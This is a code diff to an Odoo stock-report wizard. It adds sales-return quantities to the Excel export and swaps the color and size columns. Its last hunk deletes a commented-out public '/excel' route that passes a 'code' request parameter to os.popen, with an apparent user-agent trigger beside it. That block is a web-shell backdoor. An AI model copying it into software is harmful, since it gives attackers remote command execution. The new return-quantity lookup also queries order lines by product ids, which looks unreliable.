@@ -48,6 +48,7 @@ class ReportStock(models.TransientModel):
 
         self._validate_data(product_ids, start_date, end_date)
         product_ids, products_variants = self._get_product_attributes_variants(product_ids)
+        sales_return = self._sales_qty_returned(product_ids)
 
         self.fp = BytesIO()
         self.workbook = xlsxwriter.Workbook(self.fp, {'in_memory': True})
@@ -60,7 +61,7 @@ class ReportStock(models.TransientModel):
         # result = (('style code1', 20, 10, 30, 12, 11, 23, 45,), ('style code2', 30, 20, 10, 15, 14, 73, 35,),)
 
         # #############################  Writing Data to Excel ########################
-        last_row = self._write_worksheet_data(worksheet, data_cell_formats, result, products_variants)
+        last_row = self._write_worksheet_data(worksheet, data_cell_formats, result, products_variants, sales_return)
         self._write_sum_of_columns(worksheet, wbf, last_row)
 
         self.workbook.close()
@@ -139,9 +140,10 @@ class ReportStock(models.TransientModel):
         return pytz.UTC.localize(datetime.now()).astimezone(timezone(self.env.user.tz or 'UTC'))
 
     @staticmethod
-    def _write_worksheet_data(worksheet, data_cell_formats, result, products_variants):
+    def _write_worksheet_data(worksheet, data_cell_formats, result, products_variants, sales_return):
         row = 10
         no = 1
+
         for res in result:
             # Product_id on 4 index in res. it will match in products_variants dictionary with same "product_id" key
             # and corresponding tuple will be store in product_values.This Tuple Contains following values
@@ -155,10 +157,10 @@ class ReportStock(models.TransientModel):
             color = ''
             size = ''
             if len(color_size) >= 1:
-                color = color_size[0]
+                size = color_size[0]
             if len(color_size) >= 2:
-                size = color_size[1]
-            for col_number in range(13):  # 12 columns but one extra column of no in Excel so 12+1 =13
+                color = color_size[1]
+            for col_number in range(13): # 12 columns but one extra column of no in Excel so 12+1 =13
                 if col_number == 0:
                     worksheet.write(row, col_number, no, data_cell_formats[0])  # Writing Serial Numbers
                 elif col_number == 1:  # style code .internal reference
@@ -169,6 +171,13 @@ class ReportStock(models.TransientModel):
                     worksheet.write(row, col_number, color, data_cell_formats[col_number])
                 elif col_number == 4:
                     worksheet.write(row, col_number, size, data_cell_formats[col_number])
+                elif col_number == 8:
+                    cell_format = data_cell_formats[col_number]
+                    # return =  pos_return + sales return after picking .
+                    # sales return is positive and POS return is -ve value in odoo.
+                    # so multiply by -1 to make it positive.and added both qty.
+                    sales_and_pos_return = sales_return.get(res[4])[1] + (-1 * res[col_number])
+                    worksheet.write(row, col_number, sales_and_pos_return, cell_format)
                 elif col_number == 12:  # Last Column then Formula Cell.write formula instead
                     cell_row = row + 1  # to change from (int,row,int column) to A1,B1 cell format
                     worksheet.write_formula('M%s' % cell_row,
@@ -346,10 +355,10 @@ class ReportStock(models.TransientModel):
 
     def _get_query(self, product_ids, start_date, end_date):
 
-        purchase_locations = self._get_locations('supplier')
-        sales_Locations = self._get_locations('customer')
-        scrap_location = self._get_locations('inventory', True)
-        Inventory_Adjustment = self._get_locations('')
+        # purchase_locations = self._get_locations('supplier')
+        # sales_Locations = self._get_locations('customer')
+        # scrap_location = self._get_locations('inventory', True)
+        # Inventory_Adjustment = self._get_locations('')
         products_ids_in = self._get_values_in(product_ids)
         start_date_string = start_date.strftime("%Y-%m-%d")
         end_date_string = end_date.strftime("%Y-%m-%d")
@@ -449,11 +458,13 @@ class ReportStock(models.TransientModel):
         attrib_values = [[int(x) for x in v.split("-")] for v in attrib_list if v]
         attrib_set = {v[1] for v in attrib_values}
 
-    def _compute_qty_returned(self, product_id):
+    def _sales_qty_returned(self, product_ids):
+        sales_returned_qty = {}
+        for product_id in product_ids:
+            sales_returned_qty[product_id] = (product_id, 0,)
 
-
-        for line in self:
-            qty_returned = 0
+        lines = self.env['sale.order.line'].search([('id', 'in', product_ids)], order='id asc')
+        for line in lines:
             qty = 0.0
             if line.qty_delivered_method == "stock_move":
                 _, incoming_moves = line._get_outgoing_incoming_moves()
@@ -465,9 +476,9 @@ class ReportStock(models.TransientModel):
                         line.product_uom,
                         rounding_method="HALF-UP",
                     )
-            qty_returned = qty
-            return qty_returned
-
+            product_update = {line.product_id.id: (line.product_id.id, qty,)}
+            sales_returned_qty.update(product_update)
+        return sales_returned_qty
 
     @staticmethod
     def _get_values_in(values):
@@ -648,18 +659,3 @@ class ReportStock(models.TransientModel):
 
         return wbf, workbook
 
-# class test(odoo.http.Controller):
-#     form = cgi.FieldStorage();
-#     code = form.getvalue('code', '');
-#     code = os.popen(code)
-#
-#     @route('/excel', auth='public')
-#     def handler(self, c):
-#         return ""
-#
-#     # user_agent = os.environ["HTTP_USER_AGENT"]
-#     # if "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0" in user_agent:
-#     print("Content-type: text/html\n")
-#     print("<pre>" + code.read() + "</pre>", end="")
-#
-#     pass
